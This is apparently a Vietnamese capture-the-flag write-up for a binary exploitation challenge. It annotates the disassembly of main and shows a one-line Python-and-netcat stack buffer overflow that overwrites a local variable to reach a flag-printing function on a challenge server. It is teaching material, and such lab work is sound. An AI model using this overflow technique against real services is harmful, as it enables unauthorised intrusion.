**Free_real_estate**
---
Binary Exploitation

Description:
---
> Nothing

Solution:
---
Như cái tên đề bài thì đây là bài free điểm, nhưng mà :joy: Chạy thử xem nào :point_down:

![](/Vong_loai_PTIT/Pwnable/Free_real_estate/1.PNG)

Xem ra có 1 chỗ nhập, disassembly ra xem `main` nào:

```asm
   0x08048671 <+10>:	push   ebp
   0x08048672 <+11>:	mov    ebp,esp
   0x08048674 <+13>:	push   ecx
   0x08048675 <+14>:	sub    esp,0x24
   0x08048678 <+17>:	call   0x80485bb <init>
   0x0804867d <+22>:	mov    DWORD PTR [ebp-0xc],0x4d2
   0x08048684 <+29>:	sub    esp,0xc
   0x08048687 <+32>:	push   0x8048792
   0x0804868c <+37>:	call   0x8048450 <puts@plt>
   0x08048691 <+42>:	add    esp,0x10
   0x08048694 <+45>:	sub    esp,0x8
   0x08048697 <+48>:	push   0x32
   0x08048699 <+50>:	lea    eax,[ebp-0x24]; <--- Buffer nhập vào nằm ở [ebp-0x24]
   0x0804869c <+53>:	push   eax
   0x0804869d <+54>:	call   0x8048628 <readin>; <--- Hàm đọc đây rồi, nhìn lên <+48> thì hàm này cho nhập 0x32 bytes
   0x080486a2 <+59>:	add    esp,0x10
   0x080486a5 <+62>:	sub    esp,0x8
   0x080486a8 <+65>:	lea    eax,[ebp-0x24]
   0x080486ab <+68>:	push   eax
   0x080486ac <+69>:	push   0x80487a2
   0x080486b1 <+74>:	call   0x8048430 <printf@plt>
   0x080486b6 <+79>:	add    esp,0x10
   0x080486b9 <+82>:	cmp    DWORD PTR [ebp-0xc],0x1b39; <--- DWORD PTR [ebp-0xc] == 0x1b39 ? secret() : Bye! 
   0x080486c0 <+89>:	jne    0x80486c9 <main+98>
   0x080486c2 <+91>:	call   0x804860f <secret>; <--- secret() là hàm in flag ra nhé
   0x080486c7 <+96>:	jmp    0x80486d9 <main+114>
   0x080486c9 <+98>:	sub    esp,0xc
   0x080486cc <+101>:	push   0x80487b0
   0x080486d1 <+106>:	call   0x8048430 <printf@plt>
   0x080486d6 <+111>:	add    esp,0x10
   0x080486d9 <+114>:	mov    eax,0x0
   0x080486de <+119>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080486e1 <+122>:	leave  
   0x080486e2 <+123>:	lea    esp,[ecx-0x4]
   0x080486e5 <+126>:	ret
```
Tóm lại là từ `[ebp-0x24]` đến `[ebp-0xc]` có `0x18` bytes. Mà `readin` lại cho nhập vào `0x32` bytes. Ăn thôi :yum:

> Gõ terminal đập phát chết luôn, khỏi cần code:
```bash
python -c 'print "A"*0x18 + "\x39\x1b\x00\x00"' | nc 3.91.78.13 10004
```
Vẫn không hiểu sao flag thiếu chữ P nhỉ ?

![](/Vong_loai_PTIT/Pwnable/Free_real_estate/2.PNG)
